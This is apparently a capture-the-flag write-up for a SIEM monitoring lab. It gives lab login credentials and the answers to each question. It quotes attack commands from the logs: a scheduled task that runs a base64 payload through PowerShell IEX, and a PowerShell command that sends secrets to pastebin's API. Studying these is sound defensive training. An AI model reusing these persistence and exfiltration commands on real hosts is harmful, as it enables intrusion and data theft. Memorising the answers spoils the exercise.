@@ -1,0 +1,53 @@
+Username: admin
+
+Password: Mond*yM0nit0r7
+
+Initial access was established using a downloaded file. What is the file name saved on the host?
+Step 1: Click on Policy Monitoring
+Step 2: Click on Monday Monitor
+Step 3: Update the timeframe to span from April 29, 2024, 12:00 PM to April 29, 2024, 8:00 PM.
+Step 4: Click on Microsoft office
+Step 5: You’ll notice a filter has been applied; next, click on “Event.”
+
+
+Q1 APR 29, 2024 @13:50:04.344
+data.win.event.data.commandLine section
+So the answer is: SwiftSpend_Financial_Expenses.xlsm
+
+2. What is the full command run to create a scheduled task?
+apr 29, 2024 @14:12:43:386
+Answer: \”cmd.exe\” /c \”reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= 
+/f &amp; schtasks.exe /Create /F /TN \”ATOMIC-T1053.005\” /TR \”cmd /c start /min \\\”\\\”
+ powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::
+ FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\” /sc daily /st 12:34\”
+ 
+ 3. What time is the scheduled task meant to run?
+ Answer: 12:34
+ 
+ 4. What was encoded?
+ Use https://cyberchef.org/
+ Decoding from Base64 string gives:
+ cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= 
+ Answer: ping www.youarevulnerable.thm
+ 
+ 
+ 5. What password was set for the new user account?
+Apr 29, 2024 @ 14:14:35.718	
+
+Question 6
+What is the name of the .exe that was used to dump
+ credentials?
+ -To answer this question, search for ‘mimikatz’ 
+ since the question emphasizes dumping credentials.
+
+Apr 29, 2024 @ 14:21:41.365	 
+Answer: memotech.exe
+
+Question 7
+Data was exfiltrated from the host. What was 
+the flag that was part of the data?
+search THM 
+Apr 29, 2024 @ 14:56:42.7
+ \"powershell.exe\" &amp; {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\" $content = \\\"\"secrets, api keys, passwords, 
+ THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem...\\\"\" $url = \\\"\"https://pastebin.com/api/api_post.php\\\"\" $postData = @{   api_dev_key   = $apiKey   api_option    = \\\"\"paste\\\"\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host
+ \\\"\"Your paste URL: $response\\\"\"}
